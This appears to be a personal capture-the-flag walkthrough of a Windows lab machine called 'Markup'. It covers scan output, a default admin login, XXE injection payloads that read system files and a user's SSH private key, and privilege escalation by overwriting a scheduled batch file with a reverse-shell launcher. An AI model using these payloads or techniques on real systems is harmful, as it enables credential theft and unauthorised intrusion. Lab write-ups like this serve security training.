# Markup

IPv4: 10.129.95.192

## Enumeration/Scanning

- sudo nmap -sV -sC -Pn 10.129.95.192
    
    PORT    STATE SERVICE  VERSION
    22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
    | ssh-hostkey:
    |   3072 9fa0f78cc6e2a4bd718768823e5db79f (RSA)
    |   256 907d96a96e9e4d4094e7bb55ebb30b97 (ECDSA)
    |_  256 f910eb76d46d4f3e17f393d60b8c4b81 (ED25519)
    80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
    |*http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
    | http-cookie-flags:
    |   /:
    |     PHPSESSID:
    |*      httponly flag not set
    |_http-title: MegaShopping
    443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
    |*http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
    |ssl-date: TLS randomness does not represent time
    | tls-alpn:
    |  http/1.1
    | http-cookie-flags:
    |   /:
    |     PHPSESSID:
    |*      httponly flag not set
    |_http-title: MegaShopping
    | ssl-cert: Subject: commonName=localhost
    | Not valid before: 2009-11-10T23:48:47
    |_Not valid after:  2019-11-08T23:48:47
    

Nothing useful found on browser, trying directory enumeration and sqlmap. sqlmap provides nothing useful

- sudo gobuster dir -u http://10.129.95.192/ -w /usr/share/wordlists/dirb/common.txt
    
    /.hta                 (Status: 403) [Size: 1046]
    /.htaccess            (Status: 403) [Size: 1046]
    /.htpasswd            (Status: 403) [Size: 1046]
    /aux                  (Status: 403) [Size: 1046]
    /cgi-bin/             (Status: 403) [Size: 1060]
    /com1                 (Status: 403) [Size: 1046]
    /com3                 (Status: 403) [Size: 1046]
    /com2                 (Status: 403) [Size: 1046]
    /con                  (Status: 403) [Size: 1046]
    /examples             (Status: 503) [Size: 1060]
    /images               (Status: 301) [Size: 340] [--> http://10.129.95.192/images/]
    /Images               (Status: 301) [Size: 340] [--> http://10.129.95.192/Images/]
    /index.php            (Status: 200) [Size: 12100]
    /licenses             (Status: 403) [Size: 1205]
    /lpt1                 (Status: 403) [Size: 1046]
    /lpt2                 (Status: 403) [Size: 1046]
    /nul                  (Status: 403) [Size: 1046]
    /phpmyadmin           (Status: 403) [Size: 1205]
    /prn                  (Status: 403) [Size: 1046]
    /server-info          (Status: 403) [Size: 1205]
    /server-status        (Status: 403) [Size: 1205]
    /webalizer            (Status: 403) [Size: 1046]
    

Server looks to be running php

- sudo gobuster dir -u http://10.129.95.192/ -w /usr/share/wordlists/dirb/common.txt -x .php
    
    /.hta                 (Status: 403) [Size: 1046]
    /.hta.php             (Status: 403) [Size: 1046]
    /.htaccess            (Status: 403) [Size: 1046]
    /.htaccess.php        (Status: 403) [Size: 1046]
    /.htpasswd            (Status: 403) [Size: 1046]
    /.htpasswd.php        (Status: 403) [Size: 1046]
    /about.php            (Status: 302) [Size: 108] [--> /index.php]
    /About.php            (Status: 302) [Size: 108] [--> /index.php]
    /aux                  (Status: 403) [Size: 1046]
    /aux.php              (Status: 403) [Size: 1046]
    /cgi-bin/             (Status: 403) [Size: 1060]
    /com1                 (Status: 403) [Size: 1046]
    /com2                 (Status: 403) [Size: 1046]
    /com3.php             (Status: 403) [Size: 1046]
    /com1.php             (Status: 403) [Size: 1046]
    /com2.php             (Status: 403) [Size: 1046]
    /com3                 (Status: 403) [Size: 1046]
    /con                  (Status: 403) [Size: 1046]
    /con.php              (Status: 403) [Size: 1046]
    /contact.php          (Status: 302) [Size: 110] [--> /index.php]
    /Contact.php          (Status: 302) [Size: 110] [--> /index.php]
    /db.php               (Status: 200) [Size: 0]
    /DB.php               (Status: 200) [Size: 0]
    /examples             (Status: 503) [Size: 1060]
    /home.php             (Status: 302) [Size: 107] [--> /index.php]
    /Home.php             (Status: 302) [Size: 107] [--> /index.php]
    /images               (Status: 301) [Size: 340] [--> http://10.129.95.192/images/]
    /Images               (Status: 301) [Size: 340] [--> http://10.129.95.192/Images/]
    /index.php            (Status: 200) [Size: 12100]
    /Index.php            (Status: 200) [Size: 12100]
    /index.php            (Status: 200) [Size: 12100]
    /licenses             (Status: 403) [Size: 1205]
    /lpt2.php             (Status: 403) [Size: 1046]
    /lpt1                 (Status: 403) [Size: 1046]
    /lpt1.php             (Status: 403) [Size: 1046]
    /lpt2                 (Status: 403) [Size: 1046]
    /nul                  (Status: 403) [Size: 1046]
    /nul.php              (Status: 403) [Size: 1046]
    /phpmyadmin           (Status: 403) [Size: 1205]
    /prn                  (Status: 403) [Size: 1046]
    /prn.php              (Status: 403) [Size: 1046]
    /process.php          (Status: 302) [Size: 110] [--> /index.php]
    /products.php         (Status: 302) [Size: 111] [--> /index.php]
    /Products.php         (Status: 302) [Size: 111] [--> /index.php]
    /server-info          (Status: 403) [Size: 1205]
    /server-status        (Status: 403) [Size: 1205]
    /services.php         (Status: 302) [Size: 111] [--> /index.php]
    /Services.php         (Status: 302) [Size: 111] [--> /index.php]
    /webalizer            (Status: 403) [Size: 1046]
    

Looks like I cannot access anything without credentials.

I went back and tried some basic login creds and admin password worked.

Looking through the site nothing seemed interesting so I started using burpsuite to look at requests, especially for post. After checking the order and contact page, the order page allows me to submit an order for a selected goods, through XML.

I also found a user name Daniel while browsing through page source of each page.

- Looking around google I discovered something called [XXE (XML External Entity Injections)](https://www.notion.so/XXE-Injections-bbe79add927845b18dd1c553daa3e632?pvs=21).
    
    https://portswigger.net/web-security/xxe
    
    https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9
    

## Exploitation

Checking hacktriks for how to use XXE

https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity

- Test
    
    <?xml version = "1.0"?>
    
    <!DOCTYPE foo [<!ENTITY example SYSTEM "C:/windows/system32/drivers/etc/hosts"> ]>
    
    <order><quantity>1</quantity><item>
    
    &example;
    
    Home Appliances</item><address>address</address></order>
    

Now I want to find some way to access the system, so using the username Daniel found earlier, I want to see if I can access his ssh key since port 22 is open.

Quick google search on its location:

C:\Users\<username>\.ssh\id_rsa

- XXE Read File
    
    <?xml version = "1.0"?>
    
    <!DOCTYPE foo [<!ENTITY example SYSTEM "C:/Users/Daniel/.ssh/id_rsa"> ]>
    
    <order><quantity>1</quantity><item>
    
    &example;
    
    Home Appliances</item><address>address</address></order>
    

I then copied the private key into a id_rsa file and gave it 600 permissions and ssh’d into daniel

## Privilege Escalation

Looking through the system there was nothing else useful in Users.

Looking at C:\, I found a file called job.bat in C:\Log-Management

- job.bat
    
    @echo off
    FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V
    
    IF (%adminTest%)==(Access) goto noAdmin
    for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "
    %%G")
    echo.
    echo Event Logs have been cleared!
    goto theEnd
    :do_clear
    wevtutil.exe cl %1
    goto :eof
    :noAdmin
    echo You must run this script as an Administrator!
    :theEnd
    exit
    

There is a command on windows called icacls that lists the permissions for files, and was able to find that daniel has access to it.

I then wanted to run windows suggester so I uploaded a reverse shell to the host and listened using the multi/handler on msfconsole BECAUSE WHY NOT

Was not able to find anything useful with it. So pursing the suspicious job.bat………………

This may be a repetitive job so I tried echoing a reverse shell into the bat to get a shell

Using the shell.exe I already made with msfvenom and uploaded to the host to get the reverse shell, I’m going to try and have the bat file run it to hopefully get system NT 

echo C:\Users\daniel\shell.exe > job.bat

IT WORKED JESUS H CHRIST

rooted

## Post-exploitation
